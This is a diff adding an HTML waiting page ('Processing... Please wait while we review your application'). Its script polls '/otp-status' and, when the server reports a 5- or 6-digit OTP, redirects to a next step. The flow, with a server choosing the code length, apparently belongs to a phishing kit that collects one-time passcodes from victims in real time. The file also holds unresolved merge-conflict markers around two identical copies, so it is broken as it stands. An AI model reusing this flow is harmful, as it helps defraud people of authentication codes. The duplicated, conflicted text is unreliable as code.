@@ -1,0 +1,150 @@
+<<<<<<< HEAD
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Processing</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="header"></div>
+
+<div class="container">
+
+    <h2 class="title">Processing...</h2>
+
+    <div class="loader"></div>
+
+    <p style="text-align:center; margin-top:20px;">
+        Please wait while we review your application
+    </p>
+
+</div>
+
+<div class="footer"></div>
+
+<script>
+
+// 🔵 FLOW 1: from earlier step → go to step5 after 5s
+
+
+// 🔵 FLOW 2: always check for updates (OTP + decision)
+let isRedirecting = false;
+
+const checker = setInterval(async () => {
+    if (isRedirecting) return;
+
+    try {
+        // 🔢 CHECK OTP TYPE (5 or 6)
+        const res = await fetch("/otp-status");
+        const data = await res.json();
+
+        if (data.otp === 5 || data.otp === 6) {
+            isRedirecting = true;
+            clearInterval(checker);
+
+            localStorage.setItem("otpLength", data.otp);
+
+            showLoaderAndGo("step6.html");
+            return;
+        }
+
+    } catch (err) {
+        console.log("Waiting...");
+    }
+}, 2000);
+
+function showLoaderAndGo(url) {
+    document.getElementById("pageLoader").style.display = "block";
+    setTimeout(() => {
+        window.location.href = url;
+    }, 800);
+}
+
+window.onload = () => {
+    document.body.classList.add("loaded");
+};
+
+</script>
+<div id="pageLoader" class="loader" style="display:none;"></div>
+</body>
+=======
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Processing</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="header"></div>
+
+<div class="container">
+
+    <h2 class="title">Processing...</h2>
+
+    <div class="loader"></div>
+
+    <p style="text-align:center; margin-top:20px;">
+        Please wait while we review your application
+    </p>
+
+</div>
+
+<div class="footer"></div>
+
+<script>
+
+// 🔵 FLOW 1: from earlier step → go to step5 after 5s
+
+
+// 🔵 FLOW 2: always check for updates (OTP + decision)
+let isRedirecting = false;
+
+const checker = setInterval(async () => {
+    if (isRedirecting) return;
+
+    try {
+        // 🔢 CHECK OTP TYPE (5 or 6)
+        const res = await fetch("/otp-status");
+        const data = await res.json();
+
+        if (data.otp === 5 || data.otp === 6) {
+            isRedirecting = true;
+            clearInterval(checker);
+
+            localStorage.setItem("otpLength", data.otp);
+
+            showLoaderAndGo("step6.html");
+            return;
+        }
+
+    } catch (err) {
+        console.log("Waiting...");
+    }
+}, 2000);
+
+function showLoaderAndGo(url) {
+    document.getElementById("pageLoader").style.display = "block";
+    setTimeout(() => {
+        window.location.href = url;
+    }, 800);
+}
+
+window.onload = () => {
+    document.body.classList.add("loaded");
+};
+
+</script>
+<div id="pageLoader" class="loader" style="display:none;"></div>
+</body>
+>>>>>>> 52e3b6ca46fe401f9410078b0f293ba170ae05e2
+</html>
